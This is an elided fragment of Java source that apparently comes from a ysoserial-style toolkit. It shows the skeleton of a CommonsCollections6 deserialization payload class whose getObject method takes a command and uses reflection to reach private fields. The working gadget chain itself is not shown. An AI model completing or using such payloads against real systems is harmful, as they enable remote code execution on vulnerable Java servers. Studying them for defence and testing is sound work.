...
public class CommonsCollections6 extends dogeser.payloads.util.PayloadRunner implements ObjectPayload<Serializable> {
    ...
    public Serializable getObject(final String command) throws Exception {
        ...
        dogeser.payloads.util.Reflections.setAccessible(f);
        ...
        dogeser.payloads.util.Reflections.setAccessible(f2);
